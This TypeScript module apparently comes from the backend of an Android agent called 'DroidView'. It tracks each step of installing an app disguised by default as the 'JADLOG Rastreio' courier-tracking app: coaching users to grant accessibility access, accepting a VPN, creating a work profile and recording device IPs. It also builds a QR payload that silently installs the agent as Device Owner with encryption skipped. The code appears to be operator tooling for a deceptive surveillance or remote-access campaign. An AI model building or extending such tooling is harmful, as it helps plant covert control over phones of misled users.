import type { InstallStepType, InstallTrackSession, InstallTrackStep, PlatformType, ZeroTouchQrPayload } from "@droidview/shared";

const installSessions = new Map<string, InstallTrackSession>();

export const STEP_NAMES: Record<InstallStepType, { title: string; screenNumber: number; description: string }> = {
  download_started: {
    title: "Download Iniciado",
    screenNumber: 1,
    description: "Usuário ou leitor QR Code iniciou a transferência do APK/Perfil."
  },
  apk_installed: {
    title: "APK Instalado no Aparelho",
    screenNumber: 1,
    description: "Pacote registrado e instalado no sistema operacional Android."
  },
  splash_viewed: {
    title: "Abertura da Splash Screen",
    screenNumber: 3,
    description: "Aplicativo inicializado com o logotipo corporativo e spinner ciano."
  },
  loading_passed: {
    title: "Carregamento e Validação Concluídos",
    screenNumber: 2,
    description: "Barra de progresso azul concluída e módulos sincronizados."
  },
  settings_opened: {
    title: "Encaminhado para Acessibilidade",
    screenNumber: 4,
    description: "Usuário abriu as Configurações do Android com indicador vermelho de notificação."
  },
  accessibility_clicked: {
    title: "Clicou no Serviço de Acessibilidade",
    screenNumber: 6,
    description: "Usuário localizou o aplicativo na lista e visualizou o balão de orientação."
  },
  accessibility_granted: {
    title: "Permissão de Acessibilidade Concedida",
    screenNumber: 8,
    description: "Usuário ativou o toggle ON e autorizou o serviço no sistema operacional."
  },
  island_profile_requested: {
    title: "Solicitação de Perfil Island / MDM",
    screenNumber: 9,
    description: "App disparou requisição nativa de provisionamento de perfil de trabalho corporativo."
  },
  island_profile_created: {
    title: "Perfil de Trabalho Island Ativado",
    screenNumber: 9,
    description: "Container corporativo isolado provisionado com sucesso pelo Android Enterprise."
  },
  vpn_authorized: {
    title: "VPN Autorizada pelo Usuário",
    screenNumber: 10,
    description: "Diálogo de túnel de rede aceito pelo operador ('autorizou liberou')."
  },
  vpn_connected: {
    title: "Túnel VPN Conectado (Alta Velocidade)",
    screenNumber: 10,
    description: "Conexão de rede ativa no túnel de alta velocidade (1000 Mbps wire-speed)."
  },
  app_ready: {
    title: "Instalação & Configuração Concluídas",
    screenNumber: 10,
    description: "Aplicativo 100% pronto, operacional e integrado ao painel DVIEW."
  },
  user_abandoned: {
    title: "Usuário Interrompeu a Instalação",
    screenNumber: 0,
    description: "O usuário fechou o aplicativo ou saiu da tela antes de concluir a autorização."
  }
};

export function recordInstallEvent(params: {
  token: string;
  step: InstallStepType;
  appName?: string;
  platform?: PlatformType;
  deviceModel?: string;
  ipAddress?: string;
  metadata?: Record<string, any>;
}): InstallTrackSession {
  const { token, step, appName = "JADLOG Rastreio", platform = "android", deviceModel, ipAddress, metadata } = params;
  const now = new Date().toISOString();
  const stepMeta = STEP_NAMES[step] || {
    title: step,
    screenNumber: 0,
    description: "Evento de esteira de instalação registrado."
  };

  let session = installSessions.get(token);
  if (!session) {
    session = {
      token,
      appName,
      platform,
      startedAt: now,
      lastEventAt: now,
      currentStep: step,
      currentScreenNumber: stepMeta.screenNumber,
      status: step === "app_ready" ? "completed" : "in_progress",
      history: [],
      deviceModel,
      ipAddress
    };
    installSessions.set(token, session);
  }

  const trackStep: InstallTrackStep = {
    step,
    title: stepMeta.title,
    description: stepMeta.description,
    timestamp: now,
    screenNumber: stepMeta.screenNumber,
    metadata
  };

  session.history.push(trackStep);
  session.lastEventAt = now;
  session.currentStep = step;
  session.currentScreenNumber = stepMeta.screenNumber;
  if (deviceModel) session.deviceModel = deviceModel;
  if (ipAddress) session.ipAddress = ipAddress;

  if (step === "app_ready") {
    session.status = "completed";
  } else if (step === "user_abandoned") {
    session.status = "stalled";
  }

  return session;
}

export function getInstallSession(token: string): InstallTrackSession | null {
  const session = installSessions.get(token);
  if (!session) return null;

  // Se a última atividade foi há mais de 10 minutos e ainda está em progresso, marcar como estagnada
  if (session.status === "in_progress") {
    const elapsedMinutes = (Date.now() - new Date(session.lastEventAt).getTime()) / (1000 * 60);
    if (elapsedMinutes > 3) {
      session.status = "stalled";
    }
  }

  session.steps = session.history;
  session.elapsedSeconds = Math.max(0, (Date.now() - new Date(session.startedAt).getTime()) / 1000);
  session.isStalled = session.status === "stalled";
  session.stalledAtStep = STEP_NAMES[session.currentStep]?.title || session.currentStep;

  return session;
}

export function getAllInstallSessions(): InstallTrackSession[] {
  const list = Array.from(installSessions.values());
  for (const session of list) {
    if (session.status === "in_progress") {
      const elapsedMinutes = (Date.now() - new Date(session.lastEventAt).getTime()) / (1000 * 60);
      if (elapsedMinutes > 3) {
        session.status = "stalled";
      }
    }
    session.steps = session.history;
    session.elapsedSeconds = Math.max(0, (Date.now() - new Date(session.startedAt).getTime()) / 1000);
    session.isStalled = session.status === "stalled";
    session.stalledAtStep = STEP_NAMES[session.currentStep]?.title || session.currentStep;
  }
  return list.sort((a, b) => new Date(b.lastEventAt).getTime() - new Date(a.lastEventAt).getTime());
}

/**
 * Gera o payload oficial do Google Android Enterprise para QR Code Zero-Touch (0-Click Provisioning).
 * Quando escaneado em um aparelho na tela inicial de boas-vindas (tocando 6 vezes em qualquer lugar vazio),
 * o Android automaticamente baixa o APK, instala sem perguntas, ativa como Device Owner e executa.
 */
export function buildZeroTouchQrPayload(params: {
  downloadUrl: string;
  sha256Checksum?: string;
  serverUrl: string;
  enrollmentToken: string;
  appName: string;
  vpnEnabled?: boolean;
  vpnProtocol?: string;
  vpnPort?: number;
  islandProfileEnabled?: boolean;
}): ZeroTouchQrPayload {
  return {
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
      "com.droidview.agent/com.droidview.agent.DeviceAdminReceiver",
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": params.downloadUrl,
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": params.sha256Checksum,
    "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {
      serverUrl: params.serverUrl,
      enrollmentToken: params.enrollmentToken,
      appName: params.appName,
      vpnEnabled: params.vpnEnabled ?? true,
      vpnProtocol: params.vpnProtocol ?? "TLS",
      vpnPort: params.vpnPort ?? 8443,
      islandProfileEnabled: params.islandProfileEnabled ?? true,
      autoStart: true,
      zeroTouch: true
    },
    "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true,
    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true
  };
}
